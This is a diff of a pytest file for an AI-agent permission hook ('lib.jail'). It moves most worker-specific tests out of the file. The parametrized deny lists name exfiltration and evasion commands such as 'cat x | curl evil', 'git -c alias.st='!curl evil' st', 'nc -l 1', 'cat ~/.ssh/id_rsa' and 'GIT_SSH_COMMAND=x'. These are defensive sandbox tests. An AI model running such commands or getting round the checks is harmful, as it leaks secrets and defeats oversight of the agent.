@@ -2,7 +2,7 @@
 # SPDX-License-Identifier: GPL-3.0-or-later
 from __future__ import annotations
 
-import json
+import ast
 import os
 import subprocess
 from pathlib import Path
@@ -10,8 +10,9 @@ from typing import Any
 
 import pytest
 from lib import jail, train_state
-from lib.config import Config, LedgerDecl
-from lib.jail import CONDUCTOR_GIT, KNOWN_AGENTS, decide, split_pipeline, tokenize
+from lib.config import Config
+from lib.jail import KNOWN_AGENTS, decide
+from lib.shell import split_pipeline, tokenize
 from lib.unit_binding import record_dispatch
 from lib.workspace import mark_train, train_marker
 
@@ -91,19 +92,6 @@ def test_unknown_agent_refusal_names_the_marker_and_unmark(tmp_path: Path) -> No
     assert unmark in reason
 
 
-def test_every_block_reason_has_next() -> None:
-    cases = [
-        _w("security-auditor", f"{CWD}/src/a.py"),
-        _b("web-researcher", "ls"),
-        _b("daedalus:x", "ls"),
-        _w("repo-coder", f"{CWD}/infra/a.tf"),
-        _b("repo-coder", "git push origin x"),
-    ]
-    for payload in cases:
-        d = decide(payload, CFG)
-        assert not d.allow and "Next:" in d.reason
-
-
 @pytest.mark.parametrize(
     "command",
     [
@@ -121,19 +109,24 @@ def test_every_block_reason_has_next() -> None:
     ],
 )
 def test_universal_tripwires_block_everyone(command: str) -> None:
-    for agent in (None, "main", "repo-coder", "pr-train-conductor", "charter-docs"):
+    # 0044: the workers' copy of this case runs their hook chains in tests/test_checks_*.
+    for agent in (None, "main"):
         assert not decide(_b(agent, command), CFG).allow, (agent, command)
 
 
-def test_workers_cannot_spawn_agents() -> None:
-    assert not decide(_t("repo-coder", "Agent"), CFG).allow
+def test_main_may_dispatch_and_message() -> None:
     assert decide({"tool_name": "Agent", "tool_input": {}, "cwd": CWD}, CFG).allow
-
-
-def test_workers_cannot_send_messages() -> None:
-    assert not decide(_t("repo-coder", "SendMessage"), CFG).allow
     assert decide({"tool_name": "SendMessage", "tool_input": {}, "cwd": CWD}, CFG).allow
     assert decide(_t("main", "SendMessage"), CFG).allow
+
+
+@pytest.mark.parametrize("agent", sorted(KNOWN_AGENTS - {"main"}))
+def test_known_agent_is_sent_to_the_router(agent: str) -> None:
+    # 0044: lib.jail judges the main session and foreign agents only.
+    for payload in (_b(agent, "pytest -q"), _w(agent, f"{WT}/src/a.py"), _t(agent, "WebFetch")):
+        d = decide(payload, CFG)
+        assert not d.allow and d.agent == agent
+        assert d.reason == jail.R_ROUTED.format(agent=agent)
 
 
 def test_daedalus_namespaced_agent_acts_as_bare_agent(monkeypatch: pytest.MonkeyPatch) -> None:
@@ -142,8 +135,9 @@ def test_daedalus_namespaced_agent_acts_as_bare_agent(monkeypatch: pytest.Monkey
             monkeypatch.setenv("DAEDALUS_LIVE_TEST", flag)
         else:
             monkeypatch.delenv("DAEDALUS_LIVE_TEST", raising=False)
-        assert decide(_b("daedalus:repo-coder", "pytest -q"), CFG).allow, flag
-        assert not decide(_b("daedalus:repo-coder", "git push origin x"), CFG).allow, flag
+        d = decide(_b("daedalus:repo-coder", "pytest -q"), CFG)
+        assert d.agent == "repo-coder", flag
+        assert d.reason == jail.R_ROUTED.format(agent="repo-coder"), flag
 
 
 def test_test_namespace_fails_closed_without_flag(monkeypatch: pytest.MonkeyPatch) -> None:
@@ -156,8 +150,8 @@ def test_test_namespace_fails_closed_without_flag(monkeypatch: pytest.MonkeyPatc
 
 def test_test_namespace_acts_as_bare_agent_with_flag(monkeypatch: pytest.MonkeyPatch) -> None:
     monkeypatch.setenv("DAEDALUS_LIVE_TEST", "1")
-    assert decide(_b("daedalus-probe:repo-coder", "pytest -q"), CFG).allow
-    assert not decide(_b("daedalus-probe:repo-coder", "git push origin x"), CFG).allow
+    d = decide(_b("daedalus-probe:repo-coder", "pytest -q"), CFG)
+    assert d.agent == "repo-coder" and d.reason == jail.R_ROUTED.format(agent="repo-coder")
 
 
 @pytest.mark.parametrize("flag", [None, "1"])
@@ -204,182 +198,12 @@ def test_namespaced_unknown_reason_names_normalized_agent() -> None:
     assert "'mystery'" in d.reason
 
 
-def test_bare_repo_coder_unchanged() -> None:
-    assert decide(_b("repo-coder", "pytest -q"), CFG).allow
-    assert not decide(_b("repo-coder", "git push origin x"), CFG).allow
-
-
 def test_main_cannot_write_application_code() -> None:
     assert not decide(_w(None, f"{CWD}/src/app.py"), CFG).allow
     assert not decide(_w(None, f"{CWD}/tests/test_app.py", "Edit"), CFG).allow
+    assert not decide(_w(None, "src/app.py"), CFG).allow
     assert decide(_w(None, f"{CWD}/docs/x.md"), CFG).allow
     assert decide(_b(None, "git status"), CFG).allow
-
-
-class TestRepoCoder:
-    def test_main_checkout_writes_refused(self) -> None:
-        # 0022, 0054: the main checkout is never a coder write target; see the unit worktree tests.
-        assert not decide(_w("repo-coder", f"{CWD}/src/a.py"), CFG).allow
-        assert not decide(_w("repo-coder", f"{CWD}/tests/test_a.py", "Edit"), CFG).allow
-        assert not decide(_w("repo-coder", f"{CWD}/service-manifest.json"), CFG).allow
-        assert not decide(_w("repo-coder", f"{CWD}/src/../infra/a.tf"), CFG).allow
-        assert not decide(_w("repo-coder", "/other/repo/src/a.py"), CFG).allow
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git push origin x",
-            "git remote add o u",
-            "git fetch",
-            "git pull",
-            "curl https://x",
-            "wget x",
-            "ssh host",
-            "scp a b",
-            "nc -l 1",
-            "aws s3 ls",
-            "gh pr list",
-            "npm test && curl x",
-        ],
-    )
-    def test_remote_and_network_blocked(self, command: str) -> None:
-        assert not decide(_b("repo-coder", command), CFG).allow
-
-    def test_local_work_allowed(self) -> None:
-        for command in (
-            "pytest -q",
-            "npm run test:unit",
-            f"git -C {WT} add -A && git -C {WT} commit -m 'WIP: yield'",
-            "git diff",
-        ):
-            assert decide(_b("repo-coder", command), CFG).allow, command
-
-    def test_no_web_tools(self) -> None:
-        assert not decide(_t("repo-coder", "WebFetch"), CFG).allow
-        assert not decide(_t("repo-coder", "WebSearch"), CFG).allow
-
-
-class TestContractSpec:
-    def test_writes_contracts_or_charter_specs_only(self) -> None:
-        assert decide(_w("contract-spec", f"{CWD}/contracts/openapi.yaml"), CFG).allow
-        assert decide(_w("contract-spec", "/work/Charter/specs/x.md"), CFG).allow
-        assert not decide(_w("contract-spec", f"{CWD}/src/a.py"), CFG).allow
-        assert not decide(_w("contract-spec", "/work/Charter/decision-log.md"), CFG).allow
-
-    def test_without_charter_root_only_contracts(self) -> None:
-        assert not decide(_w("contract-spec", "/work/Charter/specs/x.md"), Config()).allow
-
-
-class TestCharterDocs:
-    def test_ledger_file_is_never_written_directly(self) -> None:
-        d = decide(_w("charter-docs", "/work/Charter/decision-log.md"), CFG)
-        assert not d.allow and "append_ledger.py" in d.reason
-
-    def test_writes_charter_or_docs(self) -> None:
-        assert decide(_w("charter-docs", "/work/Charter/audit/s.md"), CFG).allow
-        assert decide(_w("charter-docs", f"{CWD}/docs/x.md"), CFG).allow
-        assert not decide(_w("charter-docs", f"{CWD}/src/a.py"), CFG).allow
-
-    def test_bash_allowlist(self) -> None:
-        ok = [
-            f"python3 {REPO_ROOT}/scripts/append_ledger.py --probe",
-            "git add docs/decisions.md",
-            "git commit -m x",
-            "git status",
-        ]
-        bad = ["git push", "python3 other.py", "rm x", "curl x", "git add -A && git push"]
-        bad += ["git add -A", "git merge --no-ff b", "git worktree list", "mkdir -p docs/.tmp"]
-        bad += ["sha256sum x", "cat x", "ls"]
-        for command in ok:
-            assert decide(_b("charter-docs", command), CFG).allow, command
-        for command in bad:
-            assert not decide(_b("charter-docs", command), CFG).allow, command
-
-
-class TestReadOnlyAgents:
-    @pytest.mark.parametrize("agent", ["security-auditor", "nist-specialist", "cis-specialist"])
-    def test_no_writes(self, agent: str) -> None:
-        for tool in ("Write", "Edit", "MultiEdit", "NotebookEdit"):
-            assert not decide(_w(agent, f"{CWD}/docs/x.md", tool), CFG).allow
-
-    def test_auditor_read_only_pipelines_including_two_pipes(self) -> None:
-        ok = [
-            "git diff main...daedalus/u1",
-            "git log --oneline -5 | head -n 3",
-            "rg TODO src | sort | uniq -c",
-            "git show HEAD:src/a.py | grep -n secret | head",
-            "cat x | jq .a",
-            "find . -name '*.py' | wc -l",
-            "git branch -a",
-            "stat x",
-        ]
-        bad = [
-            "git diff | tee out.txt",
-            "cat x > y",
-            "ls; rm x",
-            "git diff && git push",
-            "echo `id`",
-            "cat $(ls)",
-            "git checkout main",
-            "git diff | head | python3 -c 1",
-            "sed -i s/a/b/ x",
-            "gpg --list-keys",
-        ]
-        for command in ok:
-            assert decide(_b("security-auditor", command), CFG).allow, command
-        for command in bad:
-            assert not decide(_b("security-auditor", command), CFG).allow, command
-
-    def test_specialists_read_only_set(self) -> None:
-        assert decide(_b("nist-specialist", "sha256sum catalog.json"), CFG).allow
-        assert decide(_b("cis-specialist", "git diff main...b | head"), CFG).allow
-        assert not decide(_b("nist-specialist", "curl https://nist.gov"), CFG).allow
-        assert not decide(_b("cis-specialist", "git checkout x"), CFG).allow
-
-
-class TestConductor:
-    def test_push_without_force_and_pr_ops(self) -> None:
-        ok = [
-            "git push -u origin daedalus/t1",
-            "git status",
-            "git log --oneline -3",
-            "git add -A",
-            "git commit -m x",
-            "gh pr create --title t --body-file docs/.tmp/pr.md",
-            "gh run watch 123",
-            "gh run list",
-            "gitleaks detect --redact --log-opts=main..b",
-        ]
-        bad = [
-            "gh pr merge 3",
-            "gh pr close 3",
-            "gh repo delete x",
-            "git push --force",
-            "curl x",
-            "npm test",
-            "git checkout main",
-            "gh pr create && gh pr merge 1",
-        ]
-        for command in ok:
-            assert decide(_b("pr-train-conductor", command), CFG).allow, command
-        for command in bad:
-            assert not decide(_b("pr-train-conductor", command), CFG).allow, command
-
-    def test_no_writes(self) -> None:
-        assert not decide(_w("pr-train-conductor", f"{CWD}/docs/x.md"), CFG).allow
-
-
-class TestNoShellAgents:
-    @pytest.mark.parametrize("agent", ["web-researcher", "standards-rules-specialist"])
-    def test_blocks_bash_and_writes(self, agent: str) -> None:
-        assert not decide(_b(agent, "ls"), CFG).allow
-        assert not decide(_w(agent, f"{CWD}/docs/x.md"), CFG).allow
-
-    def test_only_researcher_may_fetch(self) -> None:
-        assert decide(_t("web-researcher", "WebFetch"), CFG).allow
-        assert decide(_t("web-researcher", "WebSearch"), CFG).allow
-        assert not decide(_t("standards-rules-specialist", "WebFetch"), CFG).allow
-        assert not decide(_t("nist-specialist", "WebFetch"), CFG).allow
 
 
 def test_split_pipeline() -> None:
@@ -419,23 +243,6 @@ SEPARATORS = [
     "git diff <(git diff)",
     "git diff >(cat)",
 ]
-
-
-@pytest.mark.parametrize("agent", BASH_AGENTS)
-def test_plain_git_diff_is_allowed_baseline(agent: str | None) -> None:
-    assert decide(_b(agent, "git diff"), CFG).allow
-
-
-@pytest.mark.parametrize("command", SEPARATORS)
-@pytest.mark.parametrize("agent", BASH_AGENTS)
-def test_separator_matrix_blocks(agent: str | None, command: str) -> None:
-    d = decide(_b(agent, command), CFG)
-    assert not d.allow and "Next:" in d.reason, (agent, command)
-
-
-@pytest.mark.parametrize("agent", [a for a in BASH_AGENTS if a not in PIPE_ALLOWED])
-def test_pipe_blocked_where_not_allowed(agent: str) -> None:
-    assert not decide(_b(agent, "git diff | head"), CFG).allow
 
 
 def test_tokenize() -> None:
@@ -488,7 +295,7 @@ def test_tokenize() -> None:
     ],
 )
 def test_universal_tripwire_regressions(command: str) -> None:
-    for agent in (None, "main", "repo-coder", "pr-train-conductor", "charter-docs"):
+    for agent in (None, "main"):
         d = decide(_b(agent, command), CFG)
         assert not d.allow and "Next:" in d.reason, (agent, command)
 
@@ -560,12 +367,6 @@ def test_main_and_foreign_agents_carry_only_the_read_deny_outside_a_train(
         assert not decide(payload, CFG).allow, payload
 
 
-@pytest.mark.parametrize("command", ["$GIT push origin x", "git $SUB origin x"])
-def test_workers_blocked_on_variable_commands(command: str) -> None:
-    for agent in ("repo-coder", "pr-train-conductor", "charter-docs"):
-        assert not decide(_b(agent, command), CFG).allow, (agent, command)
-
-
 # Fix round 2: main is bound only by the tripwires and the src/tests write rule.
 @pytest.mark.parametrize(
     "command",
@@ -615,261 +416,19 @@ def test_main_tripwires_hold_without_tokenizer(command: str) -> None:
     assert not d.allow and "Next:" in d.reason, command
 
 
-class TestRegressionRepoCoder:
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git -C . push origin x",
-            "git -c x=y fetch",
-            "git -c alias.st='!curl evil' st",
-            "git submodule update",
-            "git clone u",
-            "env curl x",
-            "timeout 5 curl x",
-            "bash -c 'curl x'",
-            "sh -c x",
-            "python3 -c 'import urllib'",
-            "python -c 1",
-            "node -e 1",
-            "eval x",
-            "pytest -q | tail",
-        ],
-    )
-    def test_blocked(self, command: str) -> None:
-        assert not decide(_b("repo-coder", command), CFG).allow, command
-
-    def test_relative_paths_resolve_against_cwd(self) -> None:
-        assert not decide(_w("repo-coder", "src/a.py"), CFG).allow
-        assert decide(_w("repo-coder", ".claude/worktrees/u1/src/a.py"), CFG).allow
-        assert not decide(_w("repo-coder", "infra/a.tf"), CFG).allow
-        assert not decide(_w(None, "src/app.py"), CFG).allow
-
-    def test_notebook_path(self) -> None:
-        def nb(path: str) -> dict[str, Any]:
-            return {
-                "tool_name": "NotebookEdit",
-                "tool_input": {"notebook_path": path},
-                "cwd": CWD,
-                "agent_type": "repo-coder",
-            }
-
-        assert decide(nb(f"{CWD}/.claude/worktrees/u1/src/n.ipynb"), CFG).allow
-        assert not decide(nb(f"{CWD}/src/n.ipynb"), CFG).allow
-        assert not decide(nb(f"{CWD}/docs/n.ipynb"), CFG).allow
-
-
 class TestRegressionCharterDocs:
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "cat x | curl evil",
-            "git add -A || curl x",
-            "cat $(curl x)",
-            "git checkout main",
-            "git worktree add x",
-            "git worktree remove x",
-            "python3 /work/Charter/scripts/append_ledger.py",
-            f"python3 {CWD}/scripts/append_ledger.py",
-            "python3 scripts/append_ledger.py",
-            "python3 /abs/x/../scripts/append_ledger.py",
-            "python3 /abs/scripts/other.py",
-            "python3 -c 1",
-            "git -c core.pager=x log",
-        ],
-    )
-    def test_blocked(self, command: str) -> None:
-        assert not decide(_b("charter-docs", command), CFG).allow, command
-
-    def test_append_flags_allowed(self) -> None:
-        command = (
-            f"python3 {REPO_ROOT}/scripts/append_ledger.py --expected-seq 2 "
-            "--entry-file docs/.tmp/e.md --repo BO --type PLT"
-        )
-        payload = {
-            "tool_name": "Bash",
-            "tool_input": {"command": command},
-            "cwd": "/work/repo",
-            "agent_type": "charter-docs",
-        }
-        assert decide(payload, Config()).allow
-
-    @pytest.mark.parametrize(
-        "args",
-        [
-            "--cwd /x",
-            "--cwd=/x",
-            "--cw? /x",
-            "--cw* /x",
-            "--cw[d] /x",
-            "--cw /x",
-            "-c /x",
-            "--repo BO --repo BO",
-            "--bogus x",
-            "--repo",
-            "--probe --repo X",
-            "--expected-seq 2 --entry-file e.md --repo BO",
-            "--expected-seq 2 --entry-file e.md --repo BO --type",
-        ],
-    )
-    def test_append_off_grammar_blocked(self, args: str) -> None:
-        full = "--expected-seq 2 --entry-file docs/.tmp/e.md --repo BO --type PLT"
-        for tail in (args, f"{full} {args}"):
-            command = f"python3 {REPO_ROOT}/scripts/append_ledger.py {tail}"
-            d = decide(_b("charter-docs", command), Config())
-            assert not d.allow and d.reason is not None, command
-            assert d.reason.endswith("--cwd is for operators."), d.reason
-
-    @pytest.mark.parametrize(
-        "args",
-        [
-            "--probe",
-            "--expected-seq 2 --entry-file docs/.tmp/e.md --repo BO --type PLT",
-            "--type=PLT --repo=BO --entry-file=docs/.tmp/e.md --expected-seq=2",
-        ],
-    )
-    def test_append_grammar_allowed(self, args: str) -> None:
-        command = f"python3 {REPO_ROOT}/scripts/append_ledger.py {args}"
-        assert decide(_b("charter-docs", command), Config()).allow, command
-
-    @pytest.mark.parametrize(
-        "args", ["--probe", "--expected-seq 2 --entry-file e --repo B --type P"]
-    )
-    def test_append_literal_plugin_root_blocked(self, args: str) -> None:
-        # F1: the variable is empty in agent Bash; the Next: names the absolute script.
-        command = f"python3 ${{CLAUDE_PLUGIN_ROOT}}/scripts/append_ledger.py {args}"
-        d = decide(_b("charter-docs", command), CFG)
-        assert not d.allow and d.reason is not None
-        assert f"Next: run python3 {REPO_ROOT}/scripts/append_ledger.py" in d.reason
-
     def test_main_append_cwd_allowed(self) -> None:
         command = "python3 ${CLAUDE_PLUGIN_ROOT}/scripts/append_ledger.py --probe --cwd /x"
         assert decide(_b("main", command), Config()).allow
 
-    def test_repo_scripts_ledger_allowed(self) -> None:
-        args = "--expected-seq 2 --entry-file docs/.tmp/e.md --repo BO --type PLT"
-        command = f"python3 {REPO_ROOT}/scripts/append_ledger.py {args}"
-        assert decide(_b("charter-docs", command), CFG).allow
-        assert not decide(_b("charter-docs", "git worktree list --porcelain"), CFG).allow
-
-    @pytest.mark.parametrize(
-        "script", ["/tmp/x/scripts/append_ledger.py", "/work/Charter/scripts/append_ledger.py"]
-    )
-    def test_foreign_append_ledger_blocked(self, script: str) -> None:
-        assert not decide(_b("charter-docs", f"python3 {script}"), CFG).allow
-
-
-class TestRegressionReadOnly:
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "cat x & curl evil",
-            "ls\nrm x",
-            "find . -delete",
-            "find . -exec rm {} +",
-            "find . -execdir x {} +",
-            "find . -ok x {} +",
-            "find . -okdir x {} +",
-            "find . -fprint out",
-            "find . -fprintf out %p",
-            "find . -fls out",
-            "sort -o out x",
-            "sort -uo out x",
-            "sort --output=out x",
-            "sort --output out x",
-            "rg --pre cat x",
-            "rg --pre=cat x",
-            "rg --pre-glob '*' x",
-            "git diff --output=f",
-            "git log --output f",
-            "git branch -D x",
-            "git branch newb",
-            "git -c diff.external=x diff",
-            "git -C . checkout main",
-            "uniq in out",
-            "file -C -m x",
-            "./cat x",
-            "/tmp/cat x",
-        ],
-    )
-    def test_auditor_blocked(self, command: str) -> None:
-        assert not decide(_b("security-auditor", command), CFG).allow, command
-
-    def test_auditor_branch_reads_allowed(self) -> None:
-        for command in (
-            "git branch",
-            "git branch --show-current",
-            "git branch -v",
-            "/usr/bin/cat x",
-        ):
-            assert decide(_b("security-auditor", command), CFG).allow, command
-
-    @pytest.mark.parametrize("agent", ["nist-specialist", "cis-specialist"])
-    def test_specialists_blocked(self, agent: str) -> None:
-        for command in ("find . -delete", "sort -o out x", "git diff --output=f", "git branch"):
-            assert not decide(_b(agent, command), CFG).allow, (agent, command)
-
-
-class TestRegressionConductor:
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "gh pr -R o/r merge 3",
-            "gh --repo o/r pr merge 3",
-            "gh pr --repo=o/r merge 3",
-            "gh run delete 1",
-            "gh run cancel 1",
-            "gh run rerun 1",
-            "gh pr review 3 --approve",
-            "gh pr ready 3",
-            "gh api x",
-            "gh repo view",
-            "gh pr",
-            "git push origin HEAD:main",
-            "git push origin b:master",
-            "git push origin main",
-            "git push origin refs/heads/main",
-            "git -C . push origin HEAD:main",
-            "git push --all origin",
-            "git -C . checkout main",
-            "gitleaks protect",
-            # Round 3 grammar: refspec form flipped from allowed (round 1) to blocked.
-            "git push origin daedalus/t1:daedalus/t1",
-        ],
-    )
-    def test_blocked(self, command: str) -> None:
-        assert not decide(_b("pr-train-conductor", command), CFG).allow, command
-
-    def test_default_branch_reason(self) -> None:
-        d = decide(_b("pr-train-conductor", "git push origin HEAD:main"), CFG)
-        assert d.reason and "never push to the default branch (0001)" in d.reason
-
-    def test_allowed(self) -> None:
-        for command in (
-            "gh -R o/r pr view 3",
-            "gh pr checks 3",
-            "gh run view 1",
-            "gh pr list --repo o/r",
-        ):
-            assert decide(_b("pr-train-conductor", command), CFG).allow, command
-
 
 class TestRegressionToolsAndCwd:
-    @pytest.mark.parametrize("tool", ["Task", "Agent", "mcp__claude_ai_Gmail__create_draft"])
-    def test_workers_blocked_from_meta_tools(self, tool: str) -> None:
-        for agent in sorted(KNOWN_AGENTS - {"main"}):
-            d = decide(_t(agent, tool), CFG)
-            assert (
-                not d.allow
-                and d.reason
-                == "workers use only their allowlisted tools. Next: ask the orchestrating session."
-            )
-
     def test_main_may_use_mcp(self) -> None:
         assert decide({"tool_name": "mcp__x__y", "tool_input": {}, "cwd": CWD}, CFG).allow
 
     @pytest.mark.parametrize("cwd", ["", "relative/repo"])
     def test_missing_cwd_fails_closed(self, cwd: str) -> None:
-        for agent in (None, "repo-coder"):
+        for agent in (None,):
             for payload in (_b(agent, "git status"), _w(agent, f"{CWD}/src/a.py")):
                 payload["cwd"] = cwd
                 d = decide(payload, CFG)
@@ -882,260 +441,13 @@ WORKERS_WITH_SHELL = [a for a in BASH_AGENTS]
 
 
 class TestRound3Breakage:
-    def test_quoted_filters_allowed(self) -> None:
-        assert decide(_b("security-auditor", "jq '.[] | .name' x.json"), CFG).allow
-        assert decide(_b("security-auditor", "rg 'foo|bar' src"), CFG).allow
-        assert decide(_b("nist-specialist", "jq -r '.controls[] | .id' c.json"), CFG).allow
-        assert decide(_b("security-auditor", "grep -n 'a;b' x"), CFG).allow
-        assert decide(_b("security-auditor", "grep -n '$x' src"), CFG).allow
-
-    def test_quoted_separators_in_commit_message(self) -> None:
-        for command in (
-            f"git -C {WT} commit -m 'fix: a; b'",
-            f"git -C {WT} commit -m 'a > b'",
-            f"git -C {WT} commit -m 'a | b && c'",
-            f"git -C {WT} commit -m 'cost: $5'",
-            f"git -C {WT} commit -m 'fix curl handling'",
-        ):
-            assert decide(_b("repo-coder", command), CFG).allow, command
-
     def test_split_pipeline_is_quote_aware(self) -> None:
         assert split_pipeline("jq '.a | .b' x | head") == ["jq '.a | .b' x", "head"]
         assert tokenize("git commit -m 'a; b'") == [["git", "commit", "-m", "a; b"]]
 
 
-class TestRound3ConductorPushGrammar:
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git push -u origin feat/x",
-            "git push --set-upstream origin feat/x",
-            "git push origin a.b_c",
-        ],
-    )
-    def test_allowed(self, command: str) -> None:
-        assert decide(_b("pr-train-conductor", command), CFG).allow
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git push origin feat/x extra",
-            "git push --mirror origin",
-            "git push origin HEAD:heads/main",
-            "git push origin 'refs/heads/*:refs/heads/*'",
-            "git push origin --branches",
-            "git push upstream feat/x",
-            "git push origin",
-            "git push",
-            "git push -u origin -x",
-            "git push -o ci.skip origin feat/x",
-            "git push origin .hidden",
-            "git push origin master",
-            "git push -C . origin feat/x",
-            "git -C . push origin feat/x",
-            "git push --repo=origin feat/x",
-        ],
-    )
-    def test_blocked(self, command: str) -> None:
-        d = decide(_b("pr-train-conductor", command), CFG)
-        assert not d.allow and "Next:" in d.reason, command
-
-    def test_grammar_reason(self) -> None:
-        d = decide(_b("pr-train-conductor", "git push origin feat/x extra"), CFG)
-        assert d.reason and "one named branch to origin" in d.reason
-
-
-class TestRound3WorkerGitGrammar:
-    @pytest.mark.parametrize(
-        ("agent", "command"),
-        [
-            ("security-auditor", "git log --output=x"),
-            ("security-auditor", "git diff --ext-diff"),
-            ("security-auditor", "git log --format=%H --output=y"),
-            ("security-auditor", "git show --textconv HEAD"),
-            ("security-auditor", "git status --ignored"),
-            ("security-auditor", "git ls-files --others"),
-            ("security-auditor", "git rev-parse --git-path x"),
-            ("security-auditor", "git grep x"),
-            ("nist-specialist", "git log --exec x"),
-            # Round 4: `git commit -am x` flipped to allowed by ruling (see TestRound4Breakage).
-            ("charter-docs", "git commit -F /etc/passwd"),
-            ("charter-docs", "git commit --amend -m x"),
-            ("charter-docs", "git merge --squash b"),
-            ("charter-docs", "git worktree list --verbose"),
-            ("charter-docs", "git add --force x"),
-            ("charter-docs", "git -C /other/repo status"),
-            ("charter-docs", "git --git-dir=/x status"),
-            ("pr-train-conductor", "git commit --amend"),
-            ("pr-train-conductor", "git branch -D x"),
-            ("pr-train-conductor", "git rebase main"),
-        ],
-    )
-    def test_blocked(self, agent: str, command: str) -> None:
-        assert not decide(_b(agent, command), CFG).allow, (agent, command)
-
-    @pytest.mark.parametrize(
-        ("agent", "command"),
-        [
-            ("security-auditor", "git log -n 5 --stat"),
-            ("security-auditor", "git diff -U3 --cached -- src"),
-            ("security-auditor", "git show --format=%H --name-only HEAD"),
-            ("security-auditor", "git rev-parse --abbrev-ref HEAD"),
-            ("security-auditor", "git ls-files -z"),
-            ("security-auditor", "git status --porcelain"),
-            ("charter-docs", "git commit -m x"),
-            ("charter-docs", "git -C /work/Charter add decision-log.md"),
-            ("charter-docs", "git -C /work/Charter status"),
-            ("charter-docs", "git -C docs status"),
-            ("charter-docs", "git add -- docs/a.md"),
-        ],
-    )
-    def test_allowed(self, agent: str, command: str) -> None:
-        assert decide(_b(agent, command), CFG).allow, (agent, command)
-
-
-class TestRound3WorkerHygiene:
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "{ curl x; }",
-            "if true; then curl x; fi",
-            "for i in a; do rm x; done",
-            "while true; do ls; done",
-            "! ls",
-            "time ls",
-            "function f { ls; }",
-            "case x in x) ls;; esac",
-            "[[ -f x ]]",
-            "coproc ls",
-            "select x in a; do ls; done",
-        ],
-    )
-    def test_reserved_words_blocked(self, command: str) -> None:
-        for agent in WORKERS_WITH_SHELL:
-            assert not decide(_b(agent, command), CFG).allow, (agent, command)
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "env ls",
-            "nice ls",
-            "nohup ls",
-            "stdbuf -oL ls",
-            "timeout 5 ls",
-            "exec ls",
-            "eval ls",
-            "xargs ls",
-            "command ls",
-            "builtin ls",
-            "source x.sh",
-            ". x.sh",
-            "sh x.sh",
-            "bash x.sh",
-            "zsh x.sh",
-            "dash x.sh",
-            "python x.py",
-            "python3 x.py",
-            "node -e 1",
-            "perl x.pl",
-            "ruby x.rb",
-            "sudo ls",
-        ],
-    )
-    def test_wrappers_blocked(self, command: str) -> None:
-        for agent in WORKERS_WITH_SHELL:
-            assert not decide(_b(agent, command), CFG).allow, (agent, command)
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "GIT_DIR=/x git status",
-            "GIT_SSH_COMMAND=x git status",
-            "GIT_CONFIG_PARAMETERS=x git status",
-            "GIT_EXTERNAL_DIFF=x git diff",
-            "cat ~/.ssh/id_rsa",
-            "cat $HOME/x",
-            "ls {a,b}",
-            "cat 'a\\b'",
-            "git diff ${X}",
-        ],
-    )
-    def test_env_and_token_hygiene(self, command: str) -> None:
-        for agent in WORKERS_WITH_SHELL:
-            assert not decide(_b(agent, command), CFG).allow, (agent, command)
-
-    def test_git_config_read_only_for_repo_coder(self) -> None:
-        assert decide(_b("repo-coder", "git config --get user.name"), CFG).allow
-        assert decide(_b("repo-coder", "git config --list"), CFG).allow
-        for command in (
-            "git config core.hooksPath x",
-            "git config --global x y",
-            "git config --get-all x --add y",
-            "git config --unset x",
-        ):
-            assert not decide(_b("repo-coder", command), CFG).allow, command
-
-    def test_repo_coder_hidden_network_and_remote(self) -> None:
-        for command in ("find . -exec curl x {} +", "find . -exec git push origin x {} +"):
-            assert not decide(_b("repo-coder", command), CFG).allow, command
-
-    def test_runner_forms_still_allowed(self) -> None:
-        for command in ("python3 -m pytest -q", "node t.js", "uv run pytest"):
-            assert decide(_b("repo-coder", command), CFG).allow, command
-
-
-class TestRound3SortPytestGitleaks:
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "sort --out=f x",
-            "sort --o=f x",
-            "sort --compress-program=gzip x",
-            "sort --compress-prog=gzip x",
-            "sort -T /tmp x",
-            "sort --temporary-directory=/tmp x",
-        ],
-    )
-    def test_sort_denies(self, command: str) -> None:
-        assert not decide(_b("security-auditor", command), CFG).allow, command
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "pytest --basetemp=/tmp/x",
-            "pytest --basetemp /tmp/x",
-            "python -m pytest --basetemp x",
-            "uv run pytest --basetemp=x",
-        ],
-    )
-    def test_basetemp_denied(self, command: str) -> None:
-        assert not decide(_b("repo-coder", command), CFG).allow, command
-
-    def test_gitleaks_report_path(self) -> None:
-        conductor = "pr-train-conductor"
-        for form in ("--report-path=/tmp/r.json", "--report-path /tmp/r.json"):
-            assert decide(_b(conductor, f"gitleaks detect --redact {form}"), CFG).allow
-        for command in (
-            "gitleaks detect --report-path /var/x/r.json",
-            "gitleaks detect -r /etc/x",
-            "gitleaks detect --report-path=/tmp/../etc/x",
-            "gitleaks detect --log-opts=--output=/x",
-            "gitleaks detect --report-path=r.json",
-        ):
-            assert not decide(_b(conductor, command), CFG).allow, command
-
-
 class TestRound3DotGitWrites:
-    @pytest.mark.parametrize(
-        ("agent", "path"),
-        [
-            (None, f"{CWD}/.git/hooks/pre-commit"),
-            ("repo-coder", f"{CWD}/src/../.git/config"),
-            ("repo-coder", f"{CWD}/src/.git/config"),
-            ("charter-docs", "/work/Charter/.git/config"),
-            ("contract-spec", f"{CWD}/contracts/.git/x"),
-        ],
-    )
+    @pytest.mark.parametrize(("agent", "path"), [(None, f"{CWD}/.git/hooks/pre-commit")])
     def test_blocked(self, agent: str | None, path: str) -> None:
         d = decide(_w(agent, path), CFG)
         assert not d.allow and ".git/" in d.reason
@@ -1364,69 +676,6 @@ class TestRound5BraceFallback:
         assert decide(_b(None, command), CFG).allow, command
 
 
-class TestRound4Conductor:
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "gitleaks detect -r/work/repo/src/a.py",
-            "gitleaks detect -vr/work/repo/src/a.py",
-            "git push origin Main",
-            "git push origin MASTER",
-            "git push -u origin mAsTeR",
-        ],
-    )
-    def test_blocked(self, command: str) -> None:
-        assert not decide(_b("pr-train-conductor", command), CFG).allow, command
-
-    @pytest.mark.parametrize(
-        "command",
-        [
